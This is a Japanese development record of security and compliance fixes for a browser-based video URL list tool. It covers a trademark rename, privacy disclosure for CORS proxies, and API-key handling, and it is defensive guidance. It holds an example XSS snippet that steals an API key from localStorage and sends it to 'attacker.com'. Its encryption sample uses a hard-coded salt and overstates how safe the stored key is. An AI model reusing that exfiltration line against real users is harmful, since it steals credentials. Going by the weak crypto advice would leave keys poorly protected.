# Video URL List Tool - セキュリティとコンプライアンス対応の記録

**作成日**: 2025-11-11  
**最終更新**: 2025-11-11  
**元資料**: `Video URL List Toolのセキュリティリスク.md`

---

## 📋 目次

1. [プロジェクト概要](#プロジェクト概要)
2. [発生した問題と対応の全体像](#発生した問題と対応の全体像)
3. [問題①：ブランディングガイドライン違反](#問題①ブランディングガイドライン違反)
4. [問題②：プライバシーポリシーの不足](#問題②プライバシーポリシーの不足)
5. [問題③：CORS Proxy の利用規約の懸念](#問題③cors-proxy-の利用規約の懸念)
6. [将来計画：YouTube Data API 導入時の対応](#将来計画youtube-data-api-導入時の対応)
7. [つまづきポイントと解決](#つまづきポイントと解決)
8. [重要な学びとベストプラクティス](#重要な学びとベストプラクティス)
9. [チェックリスト](#チェックリスト)

---

## プロジェクト概要

### 目的
YouTube チャンネルに対応した動画情報取得ツール。指定したチャンネルから動画の URL・タイトル・公開日を取得し、NotebookLM 等に貼り付け可能な形式で出力する。

### 技術構成
- **フロントエンド**: Pure HTML/CSS/JavaScript（バックエンドなし）
- **データ取得**: YouTube RSS Feed（`/feeds/videos.xml`）
- **CORS 対策**: allorigins.win（プライマリ）、corsproxy.io（フォールバック）
- **デプロイ先**: Cloudflare Pages
- **リポジトリ**: GitHub Public

### 初期状態での懸念
デプロイ済みのアプリをSNS等で公開することへの懸念から、セキュリティとコンプライアンスの確認を実施。

---

## 発生した問題と対応の全体像

| # | 問題カテゴリ | 発見契機 | 重大度 | 対応状況 |
|---|------------|---------|-------|---------|
| 1 | ブランディングガイドライン違反 | 外部指摘 | 🔴 高 | ✅ 完了 |
| 2 | プライバシーポリシー不足 | 外部指摘 | 🟡 中 | ✅ 完了 |
| 3 | CORS Proxy 利用規約の懸念 | 調査で発見 | 🟡 中 | ✅ 完了 |
| 4 | YouTube Data API 導入時の対応 | 将来計画 | 🔵 低（未実装） | 📝 計画策定 |

---

## 問題①：ブランディングガイドライン違反

### 🚨 指摘内容

```
ツールの名称に「YouTube」って入っていることですね。
シンプルに商標権に抵触する恐れがあるのと、アプリ名に「YouTube／YT／You-Tube」等を入れること自体が
Googleの規約の禁止事項になりますね。
```

**参考**: [YouTube ブランディングガイドライン](https://developers.google.com/youtube/terms/branding-guidelines?hl=ja)

### 📊 問題の詳細

#### ❌ 禁止事項
- アプリ名に「YouTube」「YT」「You-Tube」を含めること
- 例: 「YouTube URL List Tool」← 完全にNG

#### ✅ 許可事項
- 説明文での間接的な言及
- 例: 「YouTube に最適なツール」「YouTube チャンネルから取得」

### 🔧 実施した対応

#### 1. アプリ名の変更

**変更前**: `YouTube URL List Tool`  
**変更後**: `Video URL List Tool`

#### 2. 修正対象ファイル

| ファイル | 修正箇所 | 変更内容 |
|---------|---------|---------|
| `index.html` | タイトル、見出し | `YouTube URL List Tool` → `Video URL List Tool` |
| `index.html` | 説明文 | 「YouTube チャンネルに対応した」に変更 |
| `README.md` | プロジェクトタイトル | `Video URL List Tool` に変更 |
| `README.md` | 説明文 | 間接的な表現に変更 |
| `CLAUDE.md` | ドキュメントタイトル | `Video URL List Tool` に変更 |
| `IMPLEMENTATION_PLAN.md` | 全該当箇所 | 一括変更 |

#### 3. 保持した表現（技術的説明として適切）

以下は変更していません：
- ✅ 「YouTube RSS フィード」（技術用語）
- ✅ 「YouTube Data API」（正式名称）
- ✅ 「YouTube チャンネルから取得」（動作説明）
- ✅ 「YouTube の利用規約」（引用）

### ✅ 対応完了

```bash
# コミットコマンド
git add index.html README.md CLAUDE.md IMPLEMENTATION_PLAN.md
git commit -m "Rename app to 'Video URL List Tool' to comply with YouTube branding guidelines"
git push origin main
```

### 💡 重要なポイント

- **商標権**: YouTube は Google の登録商標
- **規約違反のリスク**: アプリ停止、法的措置の可能性
- **対応方針**: アプリ名から削除、説明文では間接的に言及

---

## 問題②：プライバシーポリシーの不足

### 🚨 指摘内容

```
ユーザーの入力情報や例えば IP アドレスなどの情報が、第三者（プロキシ業者やYoutube）に送られることは、
利用規約などで明示した方が、サービス提供者視点でも、サービス利用者視点でも、ベターかもしれません。
```

### 📊 問題の詳細

#### 現状の情報の流れ

```
[ユーザー]
    ↓ チャンネルID入力
[Video URL List Tool (フロントエンドのみ)]
    ↓ チャンネルID + ユーザーのIPアドレス + アクセス時刻 + ブラウザ情報
[CORS Proxy (allorigins.win / corsproxy.io)] ← ここに記録される可能性
    ↓
[YouTube RSS]
```

#### 送信される情報（ユーザーが意識していない）

| 情報 | 内容 | リスク |
|-----|------|-------|
| チャンネルID | ユーザーが入力 | 低（公開情報） |
| IPアドレス | 自動送信 | 🔴 高（位置情報推定可能） |
| アクセス時刻 | 自動送信 | 中（行動パターン） |
| ユーザーエージェント | 自動送信 | 低（ブラウザ情報） |

#### 初期のプライバシー記載（不十分）

```markdown
### プライバシーに関する注意
- 本ツールは第三者のCORS Proxyサービスを経由してデータを取得します
- 入力したチャンネルIDがこれらのサービスに送信されます
- 個人を特定できるデータは送信されません  ← ❌ これは不正確
```

**問題点**:
- ❌ IPアドレスについて明記されていない
- ❌ 「個人を特定できるデータは送信されません」は誤り（IPアドレスは個人情報になりうる）
- ❌ 利用規約として明示されていない（「注意事項」のみ）

### 🔧 実施した対応

#### 1. README.md にプライバシーポリシーを追加

```markdown
### プライバシーに関する重要な情報

#### 本ツール使用時に第三者に送信される情報

本ツールを使用すると、以下の情報が自動的に第三者サービスに送信されます：

- **入力したチャンネルID**: ユーザーが明示的に入力したYouTubeチャンネルの識別子
- **IPアドレス**: インターネット接続元の識別情報（おおよその位置情報の推定が可能）
- **アクセス時刻**: ツールを使用した日時
- **ブラウザ情報**: 使用しているブラウザの種類とバージョン

#### 送信先の第三者サービス

上記の情報は以下のサービスに送信されます：

1. **allorigins.win** (https://allorigins.win/) - プライマリCORS Proxy
2. **corsproxy.io** (https://corsproxy.io/) - フォールバック用CORS Proxy
3. **YouTube RSS** (https://www.youtube.com/feeds/videos.xml) - 動画情報の取得元

これらのサービスがどのようにデータを扱うかは、各サービスのプライバシーポリシーに依存します。
本アプリケーションの提供者は、第三者サービスのデータ管理について責任を負いません。

#### 本アプリケーション自体によるデータ管理

本アプリケーション自体は：

- ✅ ユーザーデータを保存しません（すべてブラウザ内で処理されます）
- ✅ サーバーログを記録しません
- ✅ Cookie を使用しません
- ✅ アクセス解析を行いません

#### 利用者の同意

本ツールの「取得」ボタンをクリックすることで、上記の情報が第三者サービスに送信されることに
同意したものとみなします。
```

#### 2. index.html に警告ボックスを追加

```html
<div class="info-box" style="background-color: #fff3cd; border-left-color: #ffc107;">
  <strong>プライバシーに関する注意:</strong><br>
  本ツールを使用すると、入力したチャンネルIDとIPアドレスが第三者サービス（CORS Proxy、YouTube）に
  送信されます。「取得」ボタンをクリックすることで、この情報送信に同意したものとみなします。
</div>
```

**表示イメージ**:
```
┌─────────────────────────────────────────────┐
│ ⚠️ プライバシーに関する注意:               │
│ 本ツールを使用すると、入力したチャンネル    │
│ IDとIPアドレスが第三者サービス（CORS       │
│ Proxy、YouTube）に送信されます。「取得」   │
│ ボタンをクリックすることで、この情報送信    │
│ に同意したものとみなします。                │
└─────────────────────────────────────────────┘
```

#### 3. CORS Proxy の制限情報を更新

```markdown
このツールは以下の第三者 CORS Proxy サービスを使用しています：

1. **allorigins.win** (https://api.allorigins.win/) - プライマリ
   - MIT ライセンスのオープンソースプロジェクト
   - 利用規約・レート制限は明示されていません

2. **corsproxy.io** (https://corsproxy.io/) - フォールバック
   - 開発用途では無料で使用可能
   - 「production site」での使用には有料プランが必要とされていますが、
     個人の非商用プロジェクトがこれに該当するかは不明確です
   - 本ツールは非商用の個人プロジェクトとして開発・公開されています

**注意事項:**
- レート制限により一時的に利用できない場合があります
- 第三者サービスのため、ログにチャンネルIDやIPアドレスが記録される可能性があります
- サービス停止時は取得できません
- 各サービスの利用規約は予告なく変更される可能性があります
```

### ✅ 対応完了

```bash
# コミットコマンド
git add README.md index.html
git commit -m "Add comprehensive privacy policy and CORS proxy usage disclosure"
git push origin main
```

### 💡 重要なポイント

#### サービス利用者（エンドユーザー）視点
- 「どの情報が第三者に送られるか」を知らずに使っている → トラブルのリスク
- プライバシーリスクを理解していない → 不信感
- 同意なく個人情報が収集される可能性 → 法的リスク

#### サービス提供者（開発者）視点
- 第三者のデータ収集について責任を問われる可能性
- 個人情報保護法の観点で問題になる可能性
- トラブル防止のため事前開示が必須

---

## 問題③：CORS Proxy の利用規約の懸念

### 🚨 発見した問題

調査中に `corsproxy.io` の利用規約で以下を発見：

```
"You only need an account and a paid subscription if you want to use CorsProxy 
on a production site."

"without an account, you can use CorsProxy only for development"
```

### 📊 問題の詳細

#### 「production site」の解釈

| 解釈 | 内容 | 本アプリの該当 |
|-----|------|-------------|
| 保守的な解釈 | 一般公開 = production | ❌ 該当（SNS公開済み） |
| 寛容な解釈 | 商用サイト = production | ✅ 非該当（非商用） |

**曖昧な点**:
- 個人の無料アプリをSNS公開することが「production site」に該当するかは明記されていない
- 商用サイトを意味するのか、公開されたサイト全般を意味するのかが不明確

### 🤔 つまづきポイント①：過度に保守的な解釈

#### AI の初回回答（過度に保守的）

```
⚠️ 本番環境では有料プランが必要
- SNS公開 = 本番環境 → 利用規約違反の可能性
```

#### ユーザーからの指摘

```
「本番環境では有料プランが必要」とは本当でしょうか？何を根拠に答えてますか？
```

#### 訂正後の見解

```
私の見解の訂正：
- 「production site」の定義が曖昧
- 個人の非商用アプリがこれに該当するか不明
- 過度に保守的な解釈をしていました

より現実的な判断：
1. 非商用の個人プロジェクト → 開発用途とみなせる可能性が高い
2. 収益化している → production siteに該当
3. 企業利用 → production siteに該当
```

### 🔧 実施した対応

#### 1. corsproxy.io を残す（削除しない）

**理由**:
- バックアップがあり信頼性が高い
- 既存コードをそのまま使用可能
- 非商用の個人プロジェクトであれば開発用途とみなせる可能性

**リスク管理**:
- README.md に利用規約の曖昧さを明記
- 非商用であることを明示
- 将来的に収益化する場合は有料プランを検討

#### 2. 現在のフォールバック構造（維持）

```javascript
const PROXY_CONFIG = [
  { url: 'https://api.allorigins.win/raw?url=', timeout: 10000 },  // ①
  { url: 'https://corsproxy.io/?', timeout: 10000 }                 // ②
];

// 動作の流れ：
// 1. まず allorigins.win を試す
// 2. 失敗したら corsproxy.io にフォールバック
// 3. 両方失敗したらエラー表示
```

#### 3. README.md に透明性を確保

利用規約の曖昧さと本アプリの立ち位置を明記（上記「問題②」の対応を参照）

### 📋 代替案の検討結果

| 選択肢 | メリット | デメリット | 採用 |
|-------|---------|-----------|-----|
| corsproxy.io を残す | バックアップあり、信頼性高 | 利用規約の解釈に不確実性 | ✅ |
| corsproxy.io を削除 | 利用規約の懸念を排除 | 単一障害点になる | ❌ |
| corsproxy.io に問い合わせる | 最も確実 | 回答待ち時間が必要 | 📝 将来検討 |
| 自前プロキシ構築 | 完全制御可能 | 開発コスト大 | 📝 将来検討 |

### 💡 重要なポイント

- **過度な保守性は不要**: 利用規約は解釈の余地がある
- **透明性の確保**: ユーザーに状況を開示することが重要
- **リスクの受容**: 非商用である限り、リスクは許容範囲
- **将来の見直し**: 収益化する場合は再検討が必要

---

## 将来計画：YouTube Data API 導入時の対応

### 📋 背景

現在は YouTube RSS Feed を使用しているが、将来的に YouTube Data API の導入を検討。
その場合、以下の2つの対応が必須となる。

---

### 対応A：ポリシー順守（必須）

#### 🚨 指摘内容

```
ポリシーの順守も必要です。
※APIクライアントには常時見える場所へのプライバシーポリシー掲出、YouTube規約リンク、
Googleプライバシーポリシーへのリンクなどが必須
```

**参考**:
- [YouTube API サービス利用規約](https://developers.google.com/youtube/terms/developer-policies?hl=ja)
- [YouTube API サービス - 開発者ポリシー](https://developers.google.com/youtube/terms/developer-policies-guide?hl=ja)

#### 📊 必須要件

##### 1. 常時表示が必要なリンク

```html
<!-- index.html のフッターまたはヘッダーに配置 -->
<footer class="legal-links">
  <a href="privacy-policy.html">プライバシーポリシー</a> |
  <a href="terms.html">利用規約</a> |
  <a href="https://www.youtube.com/t/terms" target="_blank">YouTube 利用規約</a> |
  <a href="https://policies.google.com/privacy" target="_blank">Google プライバシーポリシー</a>
</footer>
```

##### 2. データアクセスの同意取得

```html
<!-- 初回使用時に表示するモーダル -->
<div id="consent-modal">
  <h2>データアクセスの許可</h2>
  <p>本アプリは YouTube Data API を使用して以下のデータにアクセスします：</p>
  <ul>
    <li>チャンネル情報（チャンネルID、名前）</li>
    <li>動画情報（タイトル、URL、公開日）</li>
  </ul>
  <p>
    <a href="https://policies.google.com/privacy" target="_blank">Google プライバシーポリシー</a>
    および
    <a href="https://www.youtube.com/t/terms" target="_blank">YouTube 利用規約</a>
    に同意する必要があります。
  </p>
  <p>
    データアクセスは
    <a href="https://security.google.com/settings/security/permissions" target="_blank">
      Google セキュリティ設定
    </a>
    からいつでも取り消すことができます。
  </p>
  <label>
    <input type="checkbox" id="api-consent" required>
    上記に同意してYouTube Data APIの使用を許可します
  </label>
  <button id="accept-consent">同意して続行</button>
</div>
```

##### 3. プライバシーポリシーの必須記載内容

`privacy-policy.html` を新規作成し、以下を記載：

- YouTube API サービスの使用について
- 収集する情報の詳細
- データの使用目的
- データの保存期間
- データの共有先
- ユーザーの権利（データアクセスの取り消し、削除リクエスト）
- Cookie とトラッキング
- お問い合わせ先
- ポリシーの変更について

#### ✅ チェックリスト：ポリシー順守

- [ ] プライバシーポリシーページを作成
- [ ] 利用規約ページを作成
- [ ] Google プライバシーポリシーへのリンクを追加
- [ ] YouTube 利用規約へのリンクを追加
- [ ] Google セキュリティ設定へのアクセス方法を説明
- [ ] 初回使用時に同意モーダルを表示
- [ ] データ削除リクエストの仕組みを実装
- [ ] フッターに法的リンクを常時表示

---

### 対応B：APIキーの流出対策（必須）

#### 🚨 指摘内容とつまづきポイント

##### つまづきポイント②：「Privateリポジトリ = 安全」の誤解

```
既に考慮されていますが API キーはデプロイする場所が提供する環境変数などを利用することは必須です。
クラウド上の Git リポジトリに API キーが含まれることは大きなセキュリティリスクなので、
リポジトリがプライベートであるかどうかと、API キーを利用することと、イコールにはなりません。
```

#### 📊 よくある誤解

##### ❌ 間違った考え方

```javascript
// api-key.js
// 「このリポジトリはPrivateだから安全」と考えてAPIキーを書く
const YOUTUBE_API_KEY = "AIzaSyXXXXXXXXXXXXXXXXXX";

// git add api-key.js
// git commit -m "Add API key"
// git push
```

##### ⚠️ なぜ危険なのか

| リスク | 内容 |
|-------|------|
| **Git履歴に永久保存** | 後でファイルを削除しても履歴に残る |
| **誤って公開** | リポジトリ設定を誤ってPublicにする可能性 |
| **アカウント侵害** | GitHubアカウントが乗っ取られたらPrivateも見られる |
| **CI/CDログに露出** | GitHub Actions のログ、デバッグ出力に平文で記録 |

#### ✅ 正しい方法：環境変数を使う

##### コード内での扱い

```javascript
// ❌ NG: コードに直接書く
const API_KEY = "AIzaSyXXXXXXXXXXXXXXXXXX";

// ✅ OK: 環境変数から取得
const API_KEY = process.env.YOUTUBE_API_KEY;
```

##### .gitignore に追加

```gitignore
# 環境変数ファイルは Git にコミットしない
.env
.env.local
.env.production
```

##### .env.example をコミット（サンプルのみ）

```bash
# .env.example (サンプルのみ)
YOUTUBE_API_KEY=your_api_key_here
```

##### 環境変数の設定場所

| サービス | 設定場所 |
|---------|---------|
| Cloudflare Workers | Dashboardの環境変数設定 |
| Vercel | Settings → Environment Variables |
| Firebase | `firebase functions:config:set` コマンド |
| GitHub Actions | Repository Settings → Secrets |

#### 🏗️ 必須：バックエンドを構築する

##### 現状の問題（Pure HTML/CSS/JavaScript）

```javascript
// ❌ 危険：APIキーがソースコードに露出
const API_KEY = 'AIzaSyXXXXXXXXXXXXXXXXXXXXXXXX';
const response = await fetch(
  `https://www.googleapis.com/youtube/v3/channels?part=snippet&id=${channelId}&key=${API_KEY}`
);
```

**リスク**:
- ブラウザの開発者ツールで誰でもAPIキーを取得可能
- APIキーの不正使用による課金
- APIクォータの悪用

##### 推奨アーキテクチャ

```
[ユーザー]
    ↓ チャンネルID
[フロントエンド (Cloudflare Pages)]
    ↓ HTTPS リクエスト
[バックエンド API (Cloudflare Workers / Vercel / Firebase)]
    ↓ APIキーを使用（環境変数から取得）
[YouTube Data API]
```

##### 実装例：Cloudflare Workers（推奨）

```javascript
// workers/youtube-api.js (Cloudflare Workers)
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const channelId = url.searchParams.get('channelId');

    // 環境変数からAPIキーを取得
    const API_KEY = env.YOUTUBE_API_KEY;

    // YouTube Data API を呼び出し
    const response = await fetch(
      `https://www.googleapis.com/youtube/v3/channels?part=snippet,contentDetails&id=${channelId}&key=${API_KEY}`
    );

    const data = await response.json();

    // CORS ヘッダーを追加
    return new Response(JSON.stringify(data), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': 'https://your-app.pages.dev'
      }
    });
  }
};
```

```javascript
// app.js (フロントエンド)
async function fetchChannelVideos(channelId) {
  // 自分のWorkers エンドポイントを呼び出し
  const response = await fetch(
    `https://your-worker.workers.dev/api/youtube?channelId=${channelId}`
  );
  const data = await response.json();
  return data;
}
```

```bash
# 環境変数の設定
wrangler secret put YOUTUBE_API_KEY
# プロンプトでAPIキーを入力
```

#### ✅ チェックリスト：APIキー対策

- [ ] バックエンドAPI（Cloudflare Workers / Vercel / Firebase）を構築
- [ ] APIキーを環境変数で管理
- [ ] `.env` を `.gitignore` に追加
- [ ] `.env.example` でサンプルを提供
- [ ] フロントエンドからはバックエンドAPIのみ呼び出す
- [ ] CORS設定を適切に構成

---

### 対応C：認証・認可の実装（推奨）

#### 🚨 指摘内容

##### つまづきポイント③：認証なしの危険性

```
サービス提供者側が用意する第三者サービスの API キーを使用するのであれば、
アプリの認証や認可が必要か？、というのは検討した方が良いかもしれません。
```

#### 📊 シナリオの比較

##### シナリオA：認証なし（危険）

```
[悪意のあるユーザー]
    ↓ 大量のリクエスト（制限なし）
[あなたのバックエンドAPI]
    ↓ あなたのAPIキーを使用
[YouTube Data API]
    ↓
[APIクォータ超過 → あなたに課金]
```

**問題点**:
- 誰でもあなたのAPIを叩ける
- 悪意のあるユーザーが大量リクエストを送る
- あなたのYouTube API クォータを使い果たす
- 課金が発生する可能性

##### シナリオB：認証あり（安全）

```
[ユーザー]
    ↓ ログイン
[認証システム (Firebase Auth / Auth0)]
    ↓ トークン発行
[ユーザー]
    ↓ トークン付きリクエスト
[あなたのバックエンドAPI]
    ↓ トークン検証 + レート制限
    ↓ あなたのAPIキーを使用
[YouTube Data API]
```

#### 🔧 実装例：認証 + レート制限

```javascript
// workers/youtube-api.js
export default {
  async fetch(request, env) {
    // 1. 認証トークンを検証
    const authHeader = request.headers.get('Authorization');
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return new Response('Unauthorized', { status: 401 });
    }

    const token = authHeader.substring(7);

    // Firebase Auth トークンを検証（例）
    const isValid = await verifyFirebaseToken(token);
    if (!isValid) {
      return new Response('Invalid token', { status: 403 });
    }

    // 2. レート制限を実装（KV を使用）
    const userId = extractUserIdFromToken(token);
    const rateLimitKey = `ratelimit:${userId}`;
    const requestCount = await env.KV.get(rateLimitKey);

    if (requestCount && parseInt(requestCount) > 100) {
      return new Response('Rate limit exceeded', { status: 429 });
    }

    await env.KV.put(rateLimitKey, (parseInt(requestCount || 0) + 1).toString(), {
      expirationTtl: 3600 // 1時間でリセット
    });

    // 3. YouTube API を呼び出し
    const channelId = new URL(request.url).searchParams.get('channelId');
    const response = await fetch(
      `https://www.googleapis.com/youtube/v3/channels?part=snippet&id=${channelId}&key=${env.YOUTUBE_API_KEY}`
    );

    return response;
  }
};
```

#### 📋 認証・認可の選択肢

| 方法 | 難易度 | コスト | 推奨度 | 備考 |
|-----|-------|-------|-------|-----|
| Firebase Authentication | 低 | 無料枠あり | ⭐⭐⭐⭐⭐ | Google製で相性良 |
| Auth0 | 中 | 無料枠あり | ⭐⭐⭐⭐ | エンタープライズ向け |
| Cloudflare Access | 中 | 無料枠あり | ⭐⭐⭐ | Workers と統合 |
| JWT トークン（自前） | 高 | 無料 | ⭐⭐ | 実装コスト大 |
| APIキー認証（簡易） | 低 | 無料 | ⭐⭐ | セキュリティ低 |

#### ✅ チェックリスト：認証・認可

- [ ] 認証システムを選定（Firebase Auth 推奨）
- [ ] ログイン機能を実装
- [ ] トークン検証ロジックを実装
- [ ] レート制限を実装（ユーザーごと）
- [ ] エラーハンドリングを実装

---

### 対応D：ユーザーのAPIキー保存方法（非推奨）

#### 🚨 指摘内容

##### つまづきポイント④：localStorage の危険性

```
第三者サービスの API キーをアプリ利用者が用意する場合は、その情報を localstorage や Indexddb 
など利用者のセキュリティリスクになり得る場所には保存しない、などの考慮が必要かと思います。
```

#### 📊 シナリオ：ユーザーが自分のAPIキーを使う方式

```
[ユーザーA]
    ↓ 自分のAPIキーを入力
[あなたのアプリ（フロントエンドのみ）]
    ↓ ユーザーAのAPIキーを使用
[YouTube Data API]
    ↓
[ユーザーAのクォータを消費]
```

**メリット**:
- あなた（開発者）のAPIクォータを使わない
- バックエンドが不要
- コストが発生しない

**デメリット**:
- ユーザーがAPIキーを取得する必要がある（ハードルが高い）
- APIキーの保存方法に注意が必要

#### ❌ 危険な保存方法

##### localStorage に保存（NG）

```javascript
// ❌ NG: localStorage に平文で保存
function saveApiKey(apiKey) {
  localStorage.setItem('youtubeApiKey', apiKey);
}

// ❌ NG: 誰でも取得できる
console.log(localStorage.getItem('youtubeApiKey'));
```

**リスク**:

| リスク | 内容 |
|-------|------|
| **XSS攻撃** | 悪意のあるスクリプトが注入されると盗まれる |
| **ブラウザ拡張機能** | 悪意のある拡張機能がlocalStorageにアクセス可能 |
| **開発者ツール** | Application → Local Storage → APIキーが平文で表示 |

```javascript
// XSS攻撃の例
const stolenKey = localStorage.getItem('youtubeApiKey');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: stolenKey
});
```

##### IndexedDB に保存（NG）

```javascript
// ❌ NG: IndexedDB も同様に危険
const db = await openDB('myDB');
await db.put('apiKeys', { key: apiKey });
```

**リスク**: localStorageと同じ

#### ✅ 比較的安全な保存方法

##### 方法1：セッションのみで保持（最も安全）

```javascript
// ✅ OK: メモリ内で保持（ページリロードで消える）
let apiKey = null;

function setApiKey(key) {
  apiKey = key; // メモリ内に保存
  // localStorage には保存しない
}

function getApiKey() {
  if (!apiKey) {
    // 毎回入力を求める
    apiKey = prompt('YouTube API キーを入力してください');
  }
  return apiKey;
}
```

**メリット**:
- XSS攻撃でも盗まれにくい
- ページを閉じれば消える

**デメリット**:
- ページをリロードするたびに入力が必要

##### 方法2：SessionStorage を使う（中間案）

```javascript
// ✅ OK: sessionStorage に保存（タブを閉じれば消える）
function saveApiKey(apiKey) {
  sessionStorage.setItem('youtubeApiKey', apiKey);
}

function getApiKey() {
  return sessionStorage.getItem('youtubeApiKey');
}
```

**メリット**:
- localStorageよりは安全（タブを閉じれば消える）
- 実装が簡単

**デメリット**:
- XSS攻撃には依然として脆弱

##### 方法3：Web Crypto API で暗号化（高度）

```javascript
// ✅ OK: 暗号化してlocalStorageに保存
async function saveEncryptedApiKey(apiKey, userPassword) {
  const encoder = new TextEncoder();
  
  // ユーザーのパスワードから暗号化鍵を生成
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    encoder.encode(userPassword),
    'PBKDF2',
    false,
    ['deriveKey']
  );

  const key = await crypto.subtle.deriveKey(
    {
      name: 'PBKDF2',
      salt: encoder.encode('some-salt'),
      iterations: 100000,
      hash: 'SHA-256'
    },
    keyMaterial,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );

  // APIキーを暗号化
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoder.encode(apiKey)
  );

  // 暗号化されたデータを保存
  localStorage.setItem('encryptedApiKey', JSON.stringify({
    encrypted: Array.from(new Uint8Array(encrypted)),
    iv: Array.from(iv)
  }));
}
```

**メリット**:
- 暗号化されているので、XSS攻撃でも解読が困難
- ページリロード後も使える

**デメリット**:
- 実装が複雑
- ユーザーがパスワードを覚える必要がある

#### 💡 推奨：ユーザーのAPIキー方式は避ける

**理由**:
- セキュリティリスクが高い
- ユーザー体験が悪い（APIキー取得が面倒）
- サポートコストが高い

**代わりに**:
- 開発者（あなた）が取得したAPIキーをバックエンドで使う
- 認証・認可を実装して不正利用を防ぐ
- 無料枠を超えたら有料プランを検討

---

## つまづきポイントと解決

### 一覧表

| # | つまづきポイント | 原因 | 解決策 | 学び |
|---|---------------|------|-------|-----|
| 1 | corsproxy.io の「production site」を過度に解釈 | 保守的すぎる判断 | 利用規約の文言を正確に確認、曖昧さを受容 | 規約は解釈の余地がある |
| 2 | 「Privateリポジトリ = 安全」の誤解 | セキュリティの基本理解不足 | 環境変数の使用が必須と理解 | Git履歴は永久保存 |
| 3 | 認証なしでAPIキーを使う危険性 | APIクォータ悪用のリスク認識不足 | 認証・認可 + レート制限の実装 | 誰でもアクセス可能は危険 |
| 4 | localStorage にAPIキーを保存 | XSSリスクの認識不足 | セッションのみ or 暗号化 or 避ける | localStorage は平文で見える |

### 詳細解説

#### つまづき①：corsproxy.io の過度な解釈

**問題**:
最初、AIが「SNS公開 = production site = 有料プラン必須」と断定的に回答。

**解決**:
- 利用規約の原文を確認
- 「production site」の定義が曖昧であることを認識
- 非商用の個人プロジェクトは開発用途とみなせる可能性が高いと判断
- README.md に透明性を確保（曖昧さを明記）

**学び**:
- 利用規約は解釈の余地がある
- 過度に保守的になる必要はない
- ただし、透明性の確保は重要

#### つまづき②：Privateリポジトリの誤解

**問題**:
「GitHubをPrivateにすればAPIキーを安全に保存できる」という誤解。

**解決**:
- **Git履歴は永久保存**されることを理解
- 環境変数を使う方法を学習
- `.gitignore` に `.env` を追加

**学び**:
- Privateリポジトリでも危険
- APIキーは絶対にコミットしない
- 環境変数の使用が必須

#### つまづき③：認証なしの危険性

**問題**:
バックエンドAPIを誰でもアクセス可能な状態にすると、APIクォータを悪用される。

**解決**:
- 認証・認可の実装（Firebase Auth など）
- レート制限の実装（Cloudflare KV など）
- トークン検証ロジックの追加

**学び**:
- 誰でもアクセス可能 = 悪用のリスク
- 認証とレート制限はセット
- コストとセキュリティのバランス

#### つまづき④：localStorage の危険性

**問題**:
ユーザーのAPIキーを localStorage に平文で保存しようとする。

**解決**:
- XSSリスクを理解
- セッションのみで保持 or Web Crypto API で暗号化
- または、ユーザーのAPIキー方式自体を避ける

**学び**:
- localStorage は平文で見える
- 開発者ツールで簡単に確認可能
- XSS攻撃で盗まれる可能性

---

## 重要な学びとベストプラクティス

### セキュリティ

| 原則 | 内容 | 実践例 |
|-----|------|-------|
| **最小権限の原則** | 必要最小限の情報のみ収集 | チャンネルIDのみ、ユーザー名は不要 |
| **防御的設計** | 悪意のあるユーザーを想定 | XSS対策、入力検証、レート制限 |
| **透明性** | ユーザーに情報開示 | プライバシーポリシー、CORS Proxy の警告 |
| **深層防御** | 複数の防御層を重ねる | フォールバック、エラーハンドリング |

### コンプライアンス

| 原則 | 内容 | 実践例 |
|-----|------|-------|
| **規約遵守** | 第三者サービスの利用規約を確認 | Google ブランディングガイドライン |
| **事前開示** | リスクを事前に開示 | IPアドレス送信の警告 |
| **同意取得** | ユーザーの明示的な同意 | 「取得」ボタン = 同意 |
| **削除権** | データ削除の仕組み | （現状不要、保存していないため） |

### 開発プロセス

| 原則 | 内容 | 実践例 |
|-----|------|-------|
| **段階的開発** | MVP → 機能追加 | 現在はRSSのみ、将来API導入 |
| **ドキュメント化** | 決定事項を記録 | HANDOVER.md、本ファイル |
| **リスク管理** | リスクを受容・軽減・回避 | CORS Proxy のリスク受容 |
| **透明性** | ユーザーに状況を開示 | README.md に制限事項を明記 |

### APIキーの管理

| 原則 | 内容 | NG例 | OK例 |
|-----|------|------|------|
| **コミット禁止** | APIキーをGitにコミットしない | `const KEY = "AIza..."` | `.env` + `.gitignore` |
| **環境変数** | 環境変数で管理 | ハードコード | `process.env.API_KEY` |
| **Private ≠ 安全** | Privateでも Git 履歴に残る | Privateリポジトリに直接書く | 環境変数を使う |
| **バックエンド必須** | フロントエンドで使わない | ブラウザから直接API呼び出し | Workers 経由で呼び出し |

### ユーザー体験

| 原則 | 内容 | 実践例 |
|-----|------|-------|
| **分かりやすさ** | 専門用語を避ける | 「IPアドレスが送信される」 |
| **信頼性** | エラー時のフォールバック | allorigins.win → corsproxy.io |
| **透明性** | 何が起こるかを事前に説明 | プライバシー警告ボックス |
| **ハードル低減** | 複雑な設定を避ける | RSS（APIキー不要） |

---

## チェックリスト

### ✅ 完了した対応

#### セキュリティとコンプライアンス

- [x] アプリ名から「YouTube」を削除（Google ブランディングガイドライン準拠）
- [x] プライバシーポリシーを README.md に追加
- [x] index.html にプライバシー警告ボックスを追加
- [x] IPアドレスが第三者に送信されることを明記
- [x] CORS Proxy の利用規約と制限を README.md に明記
- [x] 非商用の個人プロジェクトであることを明示
- [x] XSS対策（`textContent` 使用、タグのエスケープ）
- [x] 入力検証（チャンネルID形式のチェック）
- [x] レート制限（同時3チャンネルまで、10秒タイムアウト）

#### ドキュメント

- [x] HANDOVER.md を作成（引き継ぎ用プロンプト）
- [x] 本ファイルを作成（対応記録）
- [x] README.md を更新（利用規約、プライバシーポリシー）
- [x] CLAUDE.md を更新（プロジェクト名変更）

### 📝 将来的に実施（YouTube Data API 導入時）

#### ポリシー順守

- [ ] `privacy-policy.html` を作成
- [ ] `terms.html` を作成
- [ ] フッターに法的リンクを常時表示
- [ ] 初回使用時に同意モーダルを表示
- [ ] Google プライバシーポリシーへのリンクを追加
- [ ] YouTube 利用規約へのリンクを追加
- [ ] Google セキュリティ設定へのアクセス方法を説明
